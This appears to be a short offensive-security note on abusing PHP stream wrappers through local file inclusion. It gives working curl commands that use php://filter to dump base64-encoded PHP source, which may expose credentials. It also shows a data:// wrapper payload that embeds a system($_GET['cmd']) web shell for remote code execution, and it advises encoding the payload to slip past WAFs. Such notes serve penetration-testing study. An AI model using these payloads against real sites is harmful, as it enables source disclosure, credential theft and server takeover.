
This is a protocol wrapper that can be used to represent and access local or remote file systems.

These wrappers can enable us to read executable files, like a .php file, using `php://filter`. Using a filter with prevent the file from executing.

### Filter Wrapper

`curl http://url.com/directory/page.php?page=php://filter/convert.base64-encode/resource=specified.php` - filters the output of the page into an encoding that in viewable and non-executable like base64.

Now we can decode this output in our terminal to read the php logic.

`echo "phpoutputbase64796245jhsaf7" | base64 -d` - output the logic of php file in terminal - from this output we may be able to discover some sensitive information such as login credentials or other logic that may lead to vulnerability discovery.


### Data Wrapper

The data wrapper can be used to achieve code execution. It embeds data elements as plaintext or base64 data in the running web applications code. This offers an alternative method when we cannot poison a local file with php code.

1. `echo -n '<?php echo system($_GET['cmd']);?>' | base64` - some WAFs and firewalls will filter out obvious malicious code so first we encode out payload to be embedded
2. `curl "http://url/directory/index.php?page=data://text/plain;base64,BASE64OUTPUT==&cmd=ls"` - embed the php within the webpage to be executed.

`data://` php wrapper is not enabled by default - it must be enabled by `allow_url_include` to work.

This is a handy method to bypass basic filters.



